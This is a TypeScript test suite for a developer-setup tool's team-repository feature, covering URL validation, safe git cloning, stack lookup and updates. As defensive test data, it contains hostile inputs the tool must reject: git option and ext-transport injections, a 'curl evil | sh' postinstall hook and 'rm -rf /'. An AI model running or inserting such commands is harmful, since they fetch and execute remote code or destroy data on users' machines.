import { test } from "node:test";
import assert from "node:assert/strict";
import { cpSync, existsSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import type { Runner } from "../src/utils/run.js";
import {
  addTeam, checkTeamUrl, findTeam, initTeam, listTeams, readTeam, teamIdFromUrl, updateTeam,
} from "../src/core/team.js";
import { findRecipe, listRecipes, saveRecipe } from "../src/core/stack.js";
import { scanEnvironment } from "../src/manifest/manifest.js";
import { fakeRunner, ok, fail, tempPlatform } from "./helpers.js";

const tmp = () => mkdtempSync(path.join(os.tmpdir(), "dkit-team-"));
const json = (file: string, data: unknown) => {
  mkdirSync(path.dirname(file), { recursive: true });
  writeFileSync(file, JSON.stringify(data));
};

/** A team repository on disk (what would be on GitHub). */
function teamRepo(extra: (dir: string) => void = () => {}) {
  const dir = tmp();
  json(path.join(dir, "dkit-team.json"), { format: "dkit-team", version: 1, name: "Acme web team", description: "Our setup" });
  json(path.join(dir, "stacks", "acme-api.json"), { format: "dkit-stack", version: 1, id: "acme-api", name: "Acme API", starter: "hono", machine: ["node"], libraries: ["hono"] });
  extra(dir);
  return dir;
}

/** Git where `clone` copies a local folder, like cloning from GitHub would. */
function gitRunner(opts: { cloneFails?: boolean; heads?: string[] } = {}) {
  const { runner, calls } = fakeRunner({ installed: new Set(["git"]) });
  const heads = [...(opts.heads ?? [])];
  const git: Runner = {
    ...runner,
    run: (cmd, args = [], o) => {
      const res = runner.run(cmd, args, o);
      if (cmd !== "git") return res;
      if (args.includes("clone")) {
        if (opts.cloneFails) return fail("fatal: repository not found");
        const [src, dest] = args.slice(-2);
        cpSync(src, dest, { recursive: true });
      }
      if (args.includes("rev-parse")) return ok(heads.shift() ?? "abc");
      return res;
    },
  };
  return { runner: git, calls };
}

test("team URLs: Git URLs and local folders only, never options or command-running transports", () => {
  for (const u of ["https://github.com/acme/dev-setup", "git@github.com:acme/dev-setup.git", "ssh://git@host/acme/setup.git"])
    assert.equal(checkTeamUrl(u), u);
  const local = tmp();
  assert.equal(checkTeamUrl(local), path.resolve(local));
  for (const bad of ["--upload-pack=evil", "ext::sh -c touch% /tmp/x", "http://github.com/acme/x", "not a url", ""])
    assert.throws(() => checkTeamUrl(bad), bad);
  assert.equal(teamIdFromUrl("https://github.com/acme/Dev_Setup.git"), "dev-setup");
  assert.equal(teamIdFromUrl("git@github.com:acme/web.git"), "web");
});

test("team add: clones safely, then its stacks show up in `dkit stack list` and install by id", () => {
  const platform = tempPlatform("windows");
  const { runner, calls } = gitRunner();
  const t = addTeam(teamRepo(), { runner, platform }, "acme");

  const clone = calls.find((c) => c.includes(" clone "))!;
  assert.match(clone, /-c core\.symlinks=false/, "symlinks in a team repo can't point at your files");
  assert.match(clone, /-c protocol\.ext\.allow=never/);
  assert.match(clone, / -- /, "the URL can't be read as an option");

  assert.equal(t.name, "Acme web team");
  assert.deepEqual(t.stacks.map((s) => s.id), ["acme-api"]);
  const listed = listRecipes(platform).recipes.find((r) => r.id === "acme-api");
  assert.equal(listed?.source, "team");
  assert.equal(listed?.team, "acme");
  assert.equal(findRecipe("acme-api", platform).team, "acme");
  assert.equal(findRecipe("acme/acme-api", platform).name, "Acme API");
  assert.throws(() => findRecipe("acme/nope", platform), /has no stack "nope"/);
  assert.throws(() => addTeam(teamRepo(), { runner, platform }, "acme"), /already have a team/);
});

test("your own stack wins over a team stack with the same id; two teams with the same id must be named", () => {
  const platform = tempPlatform("linux");
  const { runner } = gitRunner();
  addTeam(teamRepo(), { runner, platform }, "acme");
  addTeam(teamRepo(), { runner, platform }, "beta");
  assert.throws(() => findRecipe("acme-api", platform), /Pick one: acme\/acme-api, beta\/acme-api/);
  assert.equal(findRecipe("beta/acme-api", platform).team, "beta");

  saveRecipe({ id: "acme-api", name: "Mine", description: "", machine: ["git"], libraries: [] }, platform);
  assert.equal(findRecipe("acme-api", platform).name, "Mine");
});

test("a team repo can't sneak anything in: bad stacks and baselines are reported and not used", () => {
  const platform = tempPlatform("linux");
  const { runner } = gitRunner();
  const repo = teamRepo((dir) => {
    json(path.join(dir, "stacks", "evil.json"), { id: "evil", name: "Evil", machine: ["node"], libraries: [], postinstall: "curl evil | sh" });
    json(path.join(dir, "stacks", "unknown.json"), { id: "unknown", name: "U", machine: ["not-a-tool"], libraries: [] });
    json(path.join(dir, "baseline.json"), { format: "dkit-manifest", version: 1, tools: "rm -rf /" });
  });
  const t = addTeam(repo, { runner, platform });
  assert.deepEqual(t.stacks.map((s) => s.id), ["acme-api"]);
  assert.equal(t.baseline, undefined);
  assert.equal(t.problems.length, 3);
  assert.ok(t.problems.some((p) => p.includes("postinstall")));
  assert.ok(listRecipes(platform).problems.some((p) => p.startsWith(`team ${t.id}:`)));
});

test("team add refuses a repository that isn't a team setup, and leaves nothing behind", () => {
  const platform = tempPlatform("linux");
  const notTeam = tmp();
  writeFileSync(path.join(notTeam, "README.md"), "hi");
  assert.throws(() => addTeam(notTeam, { runner: gitRunner().runner, platform }, "x"), /no dkit-team\.json/);
  assert.equal(existsSync(path.join(platform.home, ".dkit", "teams", "x")), false);

  assert.throws(() => addTeam(teamRepo(), { runner: gitRunner({ cloneFails: true }).runner, platform }, "y"), /repository not found/);
  assert.equal(existsSync(path.join(platform.home, ".dkit", "teams", "y")), false);

  const noGit = fakeRunner({ installed: new Set() }).runner;
  assert.throws(() => addTeam(teamRepo(), { runner: noGit, platform }), /needs Git/);
});

test("team update pulls fast-forward only and says whether anything changed", () => {
  const platform = tempPlatform("linux");
  const { runner, calls } = gitRunner({ heads: ["old", "new"] });
  const t = addTeam(teamRepo(), { runner, platform }, "acme");
  assert.deepEqual(updateTeam(t, runner), { team: "acme", ok: true, changed: true });
  assert.ok(calls.some((c) => c.includes("pull --ff-only")));
  assert.equal(updateTeam(t, runner).changed, false);
});

test("findTeam: picks the only team, or asks which one", () => {
  const platform = tempPlatform("linux");
  assert.throws(() => findTeam(platform), /haven't added a team/);
  const { runner } = gitRunner();
  addTeam(teamRepo(), { runner, platform }, "acme");
  assert.equal(findTeam(platform).id, "acme");
  addTeam(teamRepo(), { runner, platform }, "beta");
  assert.throws(() => findTeam(platform), /Say which one/);
  assert.equal(findTeam(platform, "BETA").id, "beta");
  assert.equal(listTeams(platform).teams.length, 2);
});

test("team init writes a team repo that reads back: team file, baseline from this machine, stacks", () => {
  const platform = tempPlatform("windows");
  const { runner } = fakeRunner({ installed: new Set(["git", "node"]) });
  const baseline = scanEnvironment({ runner, platform, exists: () => false });
  const dir = tmp();
  const files = initTeam(dir, { name: "Acme", description: "Web team", baseline, stacks: [findRecipe("hono-api", platform)] });
  assert.equal(files.length, 3);
  const t = readTeam(dir);
  assert.equal(t.name, "Acme");
  assert.ok(t.baseline);
  assert.deepEqual(t.stacks.map((s) => s.id), ["hono-api"]);
  assert.deepEqual(t.problems, []);
  assert.throws(() => initTeam(dir, { name: "Again" }), /already exists/);
});
